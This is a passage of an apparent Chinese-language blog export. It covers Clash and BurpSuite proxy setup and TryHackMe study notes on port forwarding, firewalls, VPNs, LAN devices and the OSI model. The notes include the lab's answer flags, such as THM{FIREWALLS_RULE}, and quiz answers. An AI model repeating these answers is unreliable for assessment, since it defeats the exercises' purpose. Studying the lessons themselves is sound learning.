<h3 id="测试终端流量代理"><a href="#测试终端流量代理" class="headerlink" title="测试终端流量代理"></a>测试终端流量代理</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试终端流量是否被成功代理，返回结果为ok则说明终端代理配置成功！</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在所有想走代理的终端命令前面添加proxychains4即可</span></span><br><span class="line">proxychains4 curl -sSf http://www.google.com &gt; /dev/null    #test ok √</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/2857591-20230508230748722-1178580563.png"
                      alt="image-20230501215340251"
                ></p>
<h2 id="浏览器端流量代理设置"><a href="#浏览器端流量代理设置" class="headerlink" title="浏览器端流量代理设置"></a>浏览器端流量代理设置</h2><h3 id="添加浏览器代理"><a href="#添加浏览器代理" class="headerlink" title="添加浏览器代理"></a>添加浏览器代理</h3><p>以下两种方法任选其一即可：</p>
<ul>
<li><p>使用浏览器代理插件，以火狐浏览器为例，使用FoxyProxy添加代理<code>127.0.0.1 7890</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/2857591-20230508230749103-359792420.png"
                      alt="image-20230501220409534"
                ></p>
</li>
<li><p>打开本地浏览器设置，在网络设置中选择手动配置代理，并填写<code>127.0.0.1 7890</code>。</p>
<p>通过地址栏快捷访问浏览器的设置界面：<code>about:preferences</code>。</p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/2857591-20230508230749427-1894573037.png"
                      alt="image-20230501222137401"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/2857591-20230508230749757-395404947.png"
                      alt="image-20230501220932834"
                ></p>
<p>tips：上述端口号<code>7890</code>可通过查看配置文件<code>/root/.config/clash/config.yaml</code>得知。</p>
<h3 id="测试浏览器端流量代理"><a href="#测试浏览器端流量代理" class="headerlink" title="测试浏览器端流量代理"></a>测试浏览器端流量代理</h3><p>配置好浏览器代理之后，访问 <a class="link"   href="http://www.google.com/" >www.google.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，查看页面响应情况。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/2857591-20230508230750113-568475238.png"
                      alt="image-20230501230523149"
                ></p>
<h2 id="BurpSuite和calsh代理兼容问题"><a href="#BurpSuite和calsh代理兼容问题" class="headerlink" title="BurpSuite和calsh代理兼容问题"></a>BurpSuite和calsh代理兼容问题</h2><p>在使用BurpSuite抓包时，如果遇到google recaptcha等需要VPN才能访问的验证码机制，我们就需要重新配置本地浏览器代理。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/2857591-20230508230750487-443165563.png"
                      alt="image-20230501221558317"
                ></p>
<p>tips：设置好8080端口代理，这样BurpSuite才能抓到数据包。</p>
<p>然后打开BurpSuite，进入到“用户选项”下的“Connections(连接)”子选项卡界面，添加并编辑上游代理规则：</p>
<p>注意：新版BurpSuite要先点击“设置”按钮，才能开始选择“用户选项”。</p>
<p><u>中文版界面</u></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/2857591-20230508230750855-1248001512.png"
                      alt="image-20230501223436455"
                ></p>
<p><u>英文版界面</u></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/2857591-20230508230751240-481769820.png"
                      alt="image-20230501223806392"
                ></p>
<p>参考资料：</p>
<ul>
<li><a class="link"   href="https://www.iculture.cc/cybersecurity/pig=265" >https://www.iculture.cc/cybersecurity/pig=265 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://juejin.cn/post/7223566884502011959" >https://juejin.cn/post/7223566884502011959 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://juejin.cn/s/kali%E5%AE%89%E8%A3%85clash" >https://juejin.cn/s/kali%E5%AE%89%E8%A3%85clash <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <tags>
        <tag>常见问题-FAQ</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Extending Your Network(网络扩展基础介绍)-学习</title>
    <url>/2024/01/18/THM-Extending%20Your%20Network(%E7%BD%91%E7%BB%9C%E6%89%A9%E5%B1%95%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/extendingyournetwork" >https://tryhackme.com/room/extendingyournetwork <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：了解一些用于将网络扩展到 Internet(互联网公网) 的技术以及这样做的动机。</p>
<h2 id="端口转发介绍"><a href="#端口转发介绍" class="headerlink" title="端口转发介绍"></a>端口转发介绍</h2><p>端口转发是应用程序和服务连接到 Internet(互联网公网) 所需的重要步骤，如果没有端口转发，应用程序和服务(如web服务)只能对同一直连网络中的设备可用。</p>
<p>以下面的网络为例：在以下网络中，IP地址为“192.168.1.10”的服务器在端口80上运行着web服务，但该网络上只有另外两台计算机能够访问此web服务。(这种网络被称为内部网络)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327163246516.png"
                      alt="image-20230327163246516"
                ></p>
<p>如果网络管理员想让公众(通过互联网)访问上图中的网站，管理员就必须实现端口转发，如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327163735248.png"
                      alt="image-20230327163735248"
                ></p>
<p>通过上图这种设计，网络2现在可以使用网络1的公共IP地址(82.62.51.70)并通过80端口访问运行在网络1上的web服务器。</p>
<p>我们很容易将端口转发行为与防火墙的行为混淆，但是这两者是不一样的；防火墙能够决定流量是否可以通过某些端口(即使这些端口是通过端口转发开放的)。</p>
<p><em>tips：端口转发是在网络中的路由器上配置的。</em></p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327165324795.png"
                      alt="image-20230327165324795"
                ></p>
<h2 id="防火墙简介"><a href="#防火墙简介" class="headerlink" title="防火墙简介"></a>防火墙简介</h2><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/roomicon.png"
                      alt="img" style="zoom:50%;" 
                >

<p>防火墙是网络中的一种设备，它负责确定允许哪些流量进入网络和退出网络，防火墙可以被视为网络的边界安全。网络管理员可以根据多种因素将防火墙配置为允许或拒绝某些流量进入或退出网络，例如：</p>
<ul>
<li>流量从哪里来？ （防火墙是否被告知：接受&#x2F;拒绝来自特定网络的流量？）</li>
<li>流量要往哪里去？ （防火墙是否被告知：接受&#x2F;拒绝发往特定网络的流量？）</li>
<li>流量流向哪个端口？ （防火墙是否被告知：仅接受&#x2F;拒绝发往端口 80 的流量？）</li>
<li>流量使用什么协议？ （防火墙是否被告知：接受&#x2F;拒绝 UDP、TCP 或两者的流量？）</li>
</ul>
<p><em><strong>tips：防火墙将通过执行数据包检查来确定以上这些问题的答案。</strong></em></p>
<p>防火墙有各种各样的形状和大小：从可以处理大量数据的专用硬件(通常存在于像企业这样的大型网络中)到住宅路由器(通常存在于家庭网络中)或者Snort软件(一种开源入侵防御系统-IPS)，防火墙可以分为2到5类。</p>
<p>我们将在下面介绍两种主要类型的防火墙：</p>
<ul>
<li>Stateful（有状态）：这种类型的防火墙将使用来自连接的全部信息，这种防火墙不是基于单个数据包检查，而是<em><strong>基于整个连接来确定设备的行为</strong></em>；与无状态防火墙相比，有状态防火墙会消耗很多资源，因为相关的流量决策是动态的，例如，有状态防火墙可以让TCP三次握手过程中的第一部分执行失败；如果来自主机的连接不正常，这将阻塞整个设备。</li>
<li>Stateless（无状态）：这种类型的防火墙将使用一组静态规则来<em><strong>确定单个数据包是否可接受</strong></em>，例如，某设备发送了一个坏数据包并不意味着此设备随后都将会被阻塞；虽然无状态防火墙比其他防火墙使用更少的资源，但无状态防火墙的表现也更笨，例如，无状态防火墙只有在定义了规则时才有效，如果规则没有完全匹配，那么此规则实际上将是无用的；当从一组主机接收大量流量时(例如发生了分布式拒绝服务攻击-DDoS攻击)，无状态防火墙将变得非常有用。</li>
</ul>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327173045469.png"
                      alt="image-20230327173045469"
                ></p>
<h2 id="防火墙模拟示例"><a href="#防火墙模拟示例" class="headerlink" title="防火墙模拟示例"></a>防火墙模拟示例</h2><p>在和本文相关的TryHackMe实验房间中部署实验环境并回答问题。</p>
<p><strong>答题</strong></p>
<p><em>tips：正确配置防火墙规则以防止设备超载——示例中的203.0.110.1网站正在遭到攻击，请快速添加一些防火墙规则来阻止服务器崩溃（红色的数据包来自于攻击者的机器）。</em></p>
<p>添加规则：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327180344996.png"
                      alt="image-20230327180344996" style="zoom: 67%;" 
                >

<p>得到flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327180155107.png"
                      alt="image-20230327180155107"
                ></p>
<blockquote>
<p>最后得到的flag是：THM{FIREWALLS_RULE} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327175546858.png"
                      alt="image-20230327175546858"
                ></p>
<h2 id="VPN基础"><a href="#VPN基础" class="headerlink" title="VPN基础"></a>VPN基础</h2><p>虚拟专用网络(VPN-Virtual Private Network)是一种允许不同网络上的设备通过在Internet(互联网公网)上彼此之间创建专用路径(称为隧道)进行安全通信的技术，在此隧道内连接的多个设备将形成它们自己的专用网络。</p>
<p>只有同一网络中的设备(如企业的内部网络)可以直接通信，而VPN允许两个局点相连，让我们看看下图，其中有三个网络：</p>
<ol>
<li>Network #1 (Office #1)</li>
<li>Network #2 (Office #2)</li>
<li>Network #3 (两个设备通过VPN连接)</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327180844134.png"
                      alt="image-20230327180844134"
                ></p>
<p>连接在Network#3上的设备仍然是Network#1和Network#2的一部分，但这些设备同时也形成了一个私有网络(Network#3)，只有通过相关的VPN连接的设备才能在这个专用网络(Network#3)上进行通信。</p>
<p>让我们介绍VPN提供的一些其他好处:</p>
<ul>
<li>允许不同地理位置的网络进行连接：例如，拥有多个办公室网络的企业会发现VPN是有益的，因为这意味着可以从办公室网络 直接访问远程服务器或基础设施等资源。</li>
<li>提供隐秘性：VPN使用了加密技术来保护数据，这意味着数据包只能在发送它的设备和目的地之间被理解，这些数据不容易被嗅探；VPN加密技术在有公共WiFi的地方可能很有用处，因为普通的公共WiFi网络并不提供加密；你可以使用VPN来保护你所使用的流量不被其他人查看。</li>
<li>提供匿名性：记者和其他活动人士可以依靠VPN技术 在言论自由受到控制的国家安全地报道全球问题；通常，你所使用的流量可以被你的ISP和其他中介机构查看，并能因此被跟踪，而VPN所提供的匿名级别也仅仅与网络上的其他设备如何尊重隐私有关，例如，使用一个会记录所有数据或者历史的VPN 本质上与不使用VPN的效果是一样的。</li>
</ul>
<p>例如TryHackMe网站可以使用VPN技术 将你的本地机和一些易受攻击的机器连接起来，并且不允许那些易受攻击的机器能被公众直接在互联网上访问，这意味着:</p>
<ul>
<li><p>你可以安全地与 TryHackMe网站所提供的那些易受攻击的机器 进行交互，从而进行攻击模拟；</p>
</li>
<li><p>服务提供商如ISP不会认为你在使用本地机攻击互联网上的正常机器(因为攻击正常机器可能违反了ISP的服务条款)；</p>
</li>
<li><p>使用VPN也为TryHackMe网站提供了安全性，因为 TryHackMe所提供的易受攻击的机器 无法直接通过Internet被公众访问。</p>
</li>
</ul>
<p>多年以来，VPN技术经过了不断改进，下面让我们来探讨一些现有的VPN技术：</p>
<ul>
<li><p>PPP：PPP是指点对点协议，它能提供加密以及数字验证功能，使用了PPP技术的VPN会通过私钥和公共证书(类似于SSH)来工作，如果要成功建立VPN连接，那么私钥和证书就必须完成匹配，但是，基于PPP技术进行传输的数据 并不能单独离开网络(即不可路由)；此外，PPTP将使用PPP技术来进行身份验证并提供数据加密。</p>
</li>
<li><p>PPTP：点对点隧道协议(PPTP-<strong>P</strong>oint-to-<strong>P</strong>oint <strong>T</strong>unneling <strong>P</strong>rotocol)是一种“允许PPP数据在网络中传输并离开网络”的技术，PPTP协议非常容易设置，大多数设备都支持它，然而，与其他VPN方案相比，PPTP是弱加密的。</p>
</li>
<li><p>IPSec：IPsec (Internet Protocol Security)将使用现有的IP (Internet Protocol)框架对数据进行加密，与其他VPN方案相比，IPSec更难建立，但只要建立完成，IPSec就能使用强大的加密功能，并且IPSec技术在许多设备上都能得到支持。</p>
</li>
</ul>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327202321786.png"
                      alt="image-20230327202321786"
                ></p>
<h2 id="局域网-LAN-网络设备"><a href="#局域网-LAN-网络设备" class="headerlink" title="局域网(LAN)网络设备"></a>局域网(LAN)网络设备</h2><p><strong>路由器（Router）</strong></p>
<p>路由器的工作是连接网络并在网络之间传递数据，它是通过使用路由来做到这一点的(因此得名路由器)。</p>
<p>路由是给“数据在网络中传输的过程”的标签，路由涉及在网络之间创建一条路径，以便能够成功地传递数据；路由器运行在OSI模型的第3层(网络层)，它通常具有交互式界面(如网页界面或控制台界面)，这能够允许管理员配置各种规则，如配置端口转发规则或配置防火墙规则。</p>
<p>当设备由多条路径连接时，如下面的示例图所示，路由就能发挥作用以采用最优路径：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327203318544.png"
                      alt="image-20230327203318544"
                ></p>
<p><em>tips：路由器是专用设备，它的功能与交换机不同。</em></p>
<p>从上图的例子中，我们可以看到计算机A的网络通过中间的路由器连接到计算机B的网络——共有两条路由路径可供选择，接下来的问题是：我们将采取什么路由路径？</p>
<p>使用不同的协议将决定采取不同的路由路径，此外，路径的选择还包括以下因素：</p>
<ul>
<li><p>哪条路径最短？（数据包需要通过的设备最少）</p>
</li>
<li><p>哪条路径最可靠？（之前在该路径上是否丢失过数据包）</p>
</li>
<li><p>哪条路径有更快的物理传输介质(铜缆线或光纤)？</p>
</li>
</ul>
<p><strong>交换机（Switch）</strong></p>
<p>交换机是一种专用的网络设备，它负责在网络上提供连接到多个设备的方法——一个交换机可以通过以太网电缆连接多个设备(从3到63个)。</p>
<p>交换机可以在OSI模型的第二层(数据链路层)和第三层(网络层)同时工作，然而，这是具有排他性的——第二层交换机不能在第三层运行。</p>
<p>以下图中的第二层交换机为例，交换机将通过MAC地址把帧(此处不是数据包，因为IP协议已被剥离)转发到它所连接的设备上。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327210327136.png"
                      alt="image-20230327210327136"
                ></p>
<p><em><strong>tips：上图中的交换机是第二层交换机，OSI模型的第二层是数据链路层，所以上图中的交换机只负责将帧(数据帧)发送到正确的设备上。</strong></em></p>
<p>第三层交换机能够在OSI模型的第三层（网络层）工作，第三层交换机比第二层交换机更复杂，因为它还可以执行路由器的一些职责；也就是说，第三层交换机能向设备发送帧(就像第二层交换机一样)，并能使用IP协议将数据包路由到其他设备。</p>
<p>第三层交换机的使用还涉及到了VLAN(虚拟局域网)技术，我们稍后将介绍VLAN，先假设我们有以下IP地址备用：</p>
<ul>
<li>192.168.1.1</li>
<li>192.168.2.1</li>
</ul>
<p>虚拟局域网(<strong>V</strong>irtual <strong>L</strong>ocal <strong>A</strong>rea <strong>N</strong>etwork)技术 能够允许网络中的特定设备被虚拟分割，这种分割意味着相关的网络设备可以在互联网连接等方面受益，同时相关的网络设备也将被分区处理；由VLAN技术所形成的网络隔离能够提供安全性，因为这意味着将由适当的规则来决定特定设备如何相互通信，这种网络隔离如下图所示：</p>
<p><em>tips：下图中的交换机是第三层交换机，下图示例将使用交换机划分VLAN，然后给VLAN分配IP。</em></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327212506663.png"
                      alt="image-20230327212506663"
                ></p>
<p>如上图所示：“销售部门”和“会计部门”都能够访问Internet(互联网公网)，但这两个部门网络之间并不能实现相互通信(尽管这两个部门都连接到同一个交换机)。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327214314866.png"
                      alt="image-20230327214314866"
                ></p>
<h2 id="网络模拟器示例"><a href="#网络模拟器示例" class="headerlink" title="网络模拟器示例"></a>网络模拟器示例</h2><p>部署附加到此示例的静态站点，用一个简单的网络模拟器进行实验。此模拟器将分解 数据包从点A传输到点B所需要的每一步，请尝试从computer1发送一个TCP包到computer3并得到一个flag。</p>
<p>注意：请使用Chrome或Firefox浏览器完成此练习。</p>
<p><strong>答题</strong></p>
<p>从 computer1 发送TCP包到 computer3 ：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327012723958.png"
                      alt="image-20230327012723958" style="zoom:50%;" 
                >

<p>得到的flag结果：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327012919841.png"
                      alt="image-20230327012919841" style="zoom:50%;" 
                >

<blockquote>
<p>得到的flag为：THM{YOU’VE_GOT_DATA} 。</p>
</blockquote>
<p>对应的网络日志的内容（在TCP连接全过程中 所记录的日志如下）：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">HANDSHAKE: Starting TCP/IP Handshake between computer1 and computer3</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">HANDSHAKE: Sending SYN Packet from computer1 to computer3</span></span><br><span class="line">ROUTING: computer1 says computer3 is not on my local network sending to gateway: router</span><br><span class="line">ARP REQUEST: Who has router tell computer1</span><br><span class="line">ARP RESPONSE: Hey computer1, I am router</span><br><span class="line">ARP REQUEST: Who has computer3 tell router</span><br><span class="line">ARP RESPONSE: Hey router, I am computer3</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">HANDSHAKE: computer3 received SYN Packet from computer1, sending SYN/ACK Packet to computer1</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">HANDSHAKE: computer1 received SYN/ACK Packet from computer3, sending ACK packet to computer3</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">HANDSHAKE: computer3 received ACK packet from computer1, Handshake Complete</span></span><br><span class="line">TCP: Sending TCP packet from computer1 to computer3</span><br><span class="line">TCP: computer3 received TCP Packet from computer1, sending ACK Packet to computer1</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>网络日志中共有 5 个HANDSHAKE条目。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327013125313.png"
                      alt="image-20230327013125313"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-OSI Model(OSI模型介绍)-学习</title>
    <url>/2024/01/18/THM-OSI%20Model(OSI%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/osimodelzi" >https://tryhackme.com/room/osimodelzi <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：了解决定跨网络处理数据的各个阶段的基本网络框架。</p>
<h2 id="什么是OSI模型？"><a href="#什么是OSI模型？" class="headerlink" title="什么是OSI模型？"></a>什么是OSI模型？</h2><p>OSI模型(开放系统互连模型-Open Systems Interconnection Model)是网络中使用的绝对基本模型，这个关键模型提供了一个框架，规定了所有联网设备将如何发送、接收和解释数据。</p>
<p>OSI模型的主要好处之一是：当与其他设备进行通信时，网络上的设备可以具有不同的功能和设计，而且在遵循OSI模型一致性的网络上发送的数据也可以被其他设备理解。</p>
<p>OSI模型由七层组成，从第7层到第1层，每一层都有不同的职责。</p>
<p>数据传递在OSI的每一层都会发生特定的过程，OSI的每一层都会将部分信息添加到原数据中，这个过程被称为封装，下图为OSI模型示意图：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230326005100677.png"
                      alt="image-20230326005100677" style="zoom: 67%;" 
                >

<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326005200447.png"
                      alt="image-20230326005200447"
                ></p>
<h2 id="Layer-7-应用层-Application"><a href="#Layer-7-应用层-Application" class="headerlink" title="Layer 7 - 应用层(Application)"></a>Layer 7 - 应用层(Application)</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/application.png"
                      alt="img"
                ></p>
<p>OSI模型的应用层是你最熟悉的一层，这种熟悉程度是因为应用程序层是协议和规则所在的层，应用层用于确定用户应该如何与发送或接收的数据进行交互。</p>
<p>日常的应用程序，如电子邮件客户端、浏览器或文件服务器浏览软件(如FileZilla) 等，它们能够为用户提供一个友好的图形用户界面(GUI)，这个GUI可用于用户与数据（发送的数据或接收的数据）进行交互；应用层中还包括了DNS协议(域名系统)，DNS能将网站地址转换为IP地址。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326010503208.png"
                      alt="image-20230326010503208"
                ></p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326010536829.png"
                      alt="image-20230326010536829"
                ></p>
<h2 id="Layer-6-表示层-Presentation"><a href="#Layer-6-表示层-Presentation" class="headerlink" title="Layer 6 - 表示层(Presentation)"></a>Layer 6 - 表示层(Presentation)</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/presentation.png"
                      alt="img"
                ></p>
<p>OSI模型的第6层是标准化开始发生的层。软件开发人员可以以不同的方式开发应用程序，例如电子邮件客户端等，而无论应用程序如何工作，数据仍然需要以相同的方式进行处理。</p>
<p>这一层能够充当数据与应用层(第7层)之间的翻译器。接收信息的计算机也能理解以一种格式发送到计算机的数据以另一种格式发送，例如：当你通过某种类型的电子邮件客户端发送电子邮件时，其他用户可能使用的是另一种电子邮件客户端来接收信息，但是电子邮件的内容仍然能够正常显示。</p>
<p>数据加密（如访问安全站点时使用HTTPS协议）等安全特性也将在表示层得到应用。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326154514416.png"
                      alt="image-20230326154514416"
                ></p>
<h2 id="Layer-5-会话层-Session"><a href="#Layer-5-会话层-Session" class="headerlink" title="Layer 5 - 会话层(Session)"></a>Layer 5 - 会话层(Session)</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/session.png"
                      alt="img"
                ></p>
<p>一旦数据从表示层(第6层)正确地转换或格式化，会话层(第5层)将开始创建到数据目的地(另一台计算机)的连接。当连接建立后，将同时创建一个会话，并且当该连接处于活动状态时，对应的会话也将处于活动状态。</p>
<p>会话层(第5层)将使两台计算机同步，以确保它们在发送数据和接收数据之前处于同一页面上，一旦相关的检查到位，会话层将开始把要发送的数据分成更小的数据块，并开始一次一个地发送这些数据块(Packets-数据包)；这种对数据分块处理的方式是有益的，因为如果连接发生丢失，则仅有尚未发送的部分数据块需要再次发送——而不需要重新发送全部数据块。</p>
<p>值得注意的是，会话是唯一的——这意味着数据不能在不同的会话之间传输，而只能在相同会话之间传输（一个会话将包含两端：发送数据端和接收数据端）。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326155132061.png"
                      alt="image-20230326155132061"
                ></p>
<h2 id="Layer-4-传输层-Transport"><a href="#Layer-4-传输层-Transport" class="headerlink" title="Layer 4 - 传输层(Transport)"></a>Layer 4 - 传输层(Transport)</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/transport.png"
                      alt="img"
                ></p>
<p>OSI模型的第4层在通过网络传输数据方面起着至关重要的作用。当数据在设备之间发送时，它将遵循以下两种不同的协议之一：</p>
<ul>
<li>TCP（传输控制协议）</li>
<li>UDP（用户数据报协议）</li>
</ul>
<p><strong>TCP协议</strong></p>
<p>传输控制协议（TCP-<strong>T</strong>ransmission <strong>C</strong>ontrol <strong>P</strong>rotocol）在设计时考虑到了数据传输的可靠性；并且TCP协议在发送数据和接收数据所需的时间内，将在两个设备之间保持恒定的连接——TCP协议是面向连接的。</p>
<p>不仅如此，TCP还在其设计中加入了错误检查，错误检查能够确认从会话层(第5层)发送的小块数据已经按顺序（按发送数据的顺序）被接收和重新组装。</p>
<p>让我们总结一下TCP的优点和缺点：</p>
<ul>
<li>TCP的优点：能够保证数据的准确性；能够同步两个设备，以防止彼此被数据淹没；将执行更多流程，以确保数据传输的可靠性。</li>
<li>TCP的缺点：要求两台设备之间有可靠的连接，如果没有接收到一小块数据，则无法使用整个数据块；TCP的慢速连接可能会导致其他设备达到数据传输的瓶颈，因为在数据传输完毕之前——相关的TCP连接将一直保留在接收端计算机上；TCP 比 UDP 慢得多，因为使用此协议的设备必须完成更多工作。</li>
</ul>
<p>TCP主要用于文件共享、互联网浏览或发送电子邮件等情况，因为这些服务要求数据是准确和完整的，而TCP协议的特性能够满足这些要求。</p>
<p>在下图的例子中，我们可以看到一张照片是如何被分解成来自“网络服务器”的小数据块(称为数据包)，而接收数据的计算机会将照片重新按正确的顺序完成构建。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326164124956.png"
                      alt="image-20230326164124956"
                ></p>
<p><strong>UDP协议</strong></p>
<p>现在让我们介绍用户数据报协议(UDP-<strong>U</strong>ser <strong>D</strong>atagram <strong>P</strong>rotocol)。UDP协议远不如TCP协议先进，它没有TCP所提供的多种特性，如错误检查和数据传输的可靠性。任何基于UDP协议发送的数据都无法确保不会发生数据丢失，UDP协议在进行数据传输时并没有实现设备的同步过程，UDP的特性是：无连接、不可靠、快速传输。</p>
<p>让我们总结一下UDP的优点和缺点：</p>
<ul>
<li>UDP的优点：UDP比TCP快得多；UDP让应用层(用户软件)决定是否控制数据包的发送速度；UDP不像TCP那样在设备上保留连续连接。</li>
<li>UDP的缺点：UDP不关心发送的数据是否成功被接收，容易发生数据丢失；UDP这种不稳定的数据传输方式可能会给用户糟糕的体验。</li>
</ul>
<p>我们使用与上面相同的例子，假设我们基于UDP协议传输数据，我们现在可以看到“接收数据的计算机”仅接收到数据包 #1 和 #3，这意味着图像发生了丢失。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326170113306.png"
                      alt="image-20230326170113306"
                ></p>
<p>UDP协议在需要发送小块数据的情况下很有用，例如，用于发现设备的协议(ARP协议和DHCP协议)或者视频流等更大的文件(视频的某些部分出现像素化是可允许的，像素化部分代表了对应数据的丢失)。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326160454354.png"
                      alt="image-20230326160454354"
                ></p>
<h2 id="Layer-3-网络层-Network"><a href="#Layer-3-网络层-Network" class="headerlink" title="Layer 3 - 网络层(Network)"></a>Layer 3 - 网络层(Network)</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/network.png"
                      alt="img"
                ></p>
<p>OSI模型的第三层(网络层)是路由和重新组装数据之处，而路由能够确定发送数据块时应该选择的最优路径。</p>
<p>网络层的一些协议确切地确定了数据到达设备的“最佳”路径，这些协议包括了开放最短路径优先协议(OSPF-Open Shortest Path First)和路由信息协议(RIP-Routing Information Protocol)；此外，路径的选择还由以下因素决定：</p>
<ul>
<li>哪条路径最短?也就是说，数据包需要通过的设备最少。</li>
<li>哪条路径最可靠?例如，之前在该路径上丢失过数据包吗?</li>
<li>哪条路径的物理连接更快?例如，一条路径是使用铜缆线连接(较慢)还是光纤连接(相当快)?</li>
</ul>
<p>在这一层，一切都是通过IP地址(如192.168.1.100)进行处理的，能够使用IP地址发送数据包的路由器等设备也被称为第三层设备，因为它们能够在OSI模型的第三层工作。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326174126984.png"
                      alt="image-20230326174126984"
                ></p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326174251520.png"
                      alt="image-20230326174251520"
                ></p>
<h2 id="Layer-2-数据链路层-Data-Link"><a href="#Layer-2-数据链路层-Data-Link" class="headerlink" title="Layer 2 - 数据链路层(Data Link)"></a>Layer 2 - 数据链路层(Data Link)</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/datalink.png"
                      alt="img"
                ></p>
<p>数据链路层着重于数据传输过程中的物理寻址。该层级将接收来自网络层的数据包(包括远程计算机的IP地址)，并会在数据包中添加接收端点的物理MAC(媒体访问控制)地址。</p>
